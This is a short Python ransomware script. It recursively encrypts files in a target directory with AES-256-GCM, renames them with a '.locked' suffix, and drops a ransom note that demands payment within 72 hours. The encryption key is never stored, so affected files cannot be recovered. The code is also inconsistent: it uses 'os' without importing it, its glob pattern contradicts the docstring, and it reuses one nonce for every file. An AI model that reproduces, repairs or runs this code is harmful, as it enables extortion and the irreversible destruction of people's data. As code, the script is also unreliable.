import sys
from pathlib import Path
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def create_encryption_key():
    """
    Generates a new AES-GCM encryption key and a random nonce.
    returns:
        - AESGCM: An AESGCM object initialized with a randomly generated 256-bit key.
        - bytes: A randomly generated 12-byte nonce suitable for AES-GCM encryption.
    """
    key = AESGCM.generate_key(bit_length=256)
    aes = AESGCM(key)
    nonce = os.urandom(12)
    return aes,nonce

def lock_file(text):
    """
    Renames the given file by appending '.locked' to its current suffix.
    arguments:
        The path to the file to be locked.
    """
    locked_path = text.with_suffix(text.suffix + ".locked")
    text.rename(locked_path)

def write_ransom_message(target_path):
    """
    creates a ransom note file named 'READ_ME.txt' in the specified target directory.

    arguments:
        The directory path where the ransom note will be created.
    """
    ransom_note_path = target_path / "READ_ME.txt"
    ransom_note = (
        "All your important files have been encrypted.",
        "Do not attempt to rename, modify, or decrypt the files yourself, as this may result in permanent data loss.",
        "To recover your files:",
        "1. Do not shut down or restart your computer.",
        "2. Contact us at: [ransom_email@example.com] with your unique ID: [ID]",
        "3. You will receive payment instructions and a decryption tool.",
        "You have 72 hours to comply. Failure to pay within this timeframe may result in your files being permanently inaccessible.",
        "Do not attempt to use third-party recovery tools. Only our decryption tool can restore your files.",
        "We guarantee that after payment, you will receive full access to your data.",
        "This is not a joke."
    )
    ransom_note_text = "\n".join(ransom_note)
    ransom_note_path.write_text(ransom_note_text)

def execute_ransomware(target_path: Path):
    """
    Encrypts all .txt files within the specified target directory and its subdirectories using AES-256 bit encryption,
    renames them with a .locked extension, and creates a ransom note.

    arguments:
        target (Path): The root directory to search for .txt files to encrypt.
    """
    aes, nonce = create_encryption_key()
    for text in target_path.rglob("*.mcsdf"):
        buffer = text.read_bytes()
        ciphertext = aes.encrypt(nonce, buffer, None)
        text.write_bytes(ciphertext)
        lock_file(text)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <target_directory>")
        sys.exit(1)
    
    target_directory = Path(sys.argv[1])
    target_directory.mkdir(parents=True, exist_ok=True)  # Create directory if it doesn't exist
    execute_ransomware(target_directory)
    write_ransom_message(target_directory)